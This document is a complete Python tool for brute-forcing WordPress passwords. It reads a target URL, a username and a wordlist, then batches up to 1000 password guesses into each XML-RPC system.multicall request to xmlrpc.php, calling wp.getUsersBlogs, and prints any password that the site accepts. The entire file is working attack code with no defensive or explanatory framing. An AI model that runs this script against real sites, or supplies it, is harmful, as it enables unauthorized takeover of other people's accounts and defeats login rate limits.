from requests import get, post
from os.path import isfile
from os import system


base_link = input("Link > ")

brute_link = base_link + "/xmlrpc.php"

try:
    status = get(brute_link).status_code
except:
    print("Invalid link. Aborting.")
    exit()

if status == 404:
    print("Not a wordpress website. Aborting")
    exit()



username = input("Username to bruteforce > ")

wordlist_get = input('Enter the path of the wordlist file > ')

if not isfile(wordlist_get):
    print("This file doesn't exist.")




def clean(list):
    new_list = []

    for a in list:
        if a not in new_list:
            print("'" + a + "'")
            new_list.append(a)
    
    return new_list








print("Gathering wordlist...")

wordlist = open(wordlist_get, 'r').read().splitlines()


print(f"Wordlist is ready! Wordlist length: {len(wordlist)}")


print("Optimizing wordlist...")

wordlist = clean(wordlist)

print(f"Wordlist is optimized! New wordlist length: {len(wordlist)}")



with open('wordlist.txt', 'w') as f:
    for word in wordlist:
        f.write(word + '\n')
    f.close()




if len(wordlist) <= 1000:

    content = '''
<?xml version="1.0"?>
<methodCall><methodName>system.multicall</methodName><params><param><value><array><data>
'''

    for (password, i) in zip(wordlist, range(len(wordlist))):

        content += f"""<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>{username}</string></value><value><string>{password}</string></value></data></array></value></data></array></value></member></struct></value>\n"""


    content += "</data></array></value></param></params></methodCall>"

    print("Data is ready for the request!")

    print("Sending request...")

    response = post(brute_link, data=content).text.splitlines()

    for _ in range(7):
        response.pop(0)

    for _ in range(5):
        response.pop(-1)

    result = "".join(
        element + '\n'
        for element in response
        if "struct" not in element and "403" not in element
    )



    print("Request done!")

    for (resp, word) in zip(result.splitlines(), wordlist):
        if 'Incorrect username or password.' not in resp:
            final = True
            print(word, 'is the password!')
            input("Done!")
            exit()

    print("No passwords found.")

    input("Done!")


else:
    print("Wordlist length superior to 1000! Organizing dictionary for multiple requests...")

    full_wordlist = {}


    length = 999

    words = []

    for element in wordlist:

        if wordlist.index(element) <= length:
            words.append(element)

        if wordlist.index(element) == length or element == wordlist[-1]:
            full_wordlist[int(length / 999)] = words
            words = []
            length += 1000


    for ch, value in full_wordlist.items():

        content = '''
<?xml version="1.0"?>
<methodCall><methodName>system.multicall</methodName><params><param><value><array><data>
'''

        for password in value:

            content += f"""<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>{username}</string></value><value><string>{password}</string></value></data></array></value></data></array></value></member></struct></value>\n"""


        content += "</data></array></value></param></params></methodCall>"

        print(f"Sending request {str(ch)}...")

        response = post(brute_link, data=content).text.splitlines()

        print(f"Request {str(ch)} done!")


        for _ in range(7):
            response.pop(0)

        for _ in range(5):
            response.pop(-1)

        result = "".join(
            element + '\n'
            for element in response
            if "struct" not in element and "403" not in element
        )


        for (resp, word) in zip(result.splitlines(), value):
            if 'Incorrect username or password.' not in resp:
                print(word, 'is the password!')
                input("Done!")
                exit()                                                                                 

        print(f"No passwords found for request {str(ch)}.")


    input("All requests done, no passwords found.")


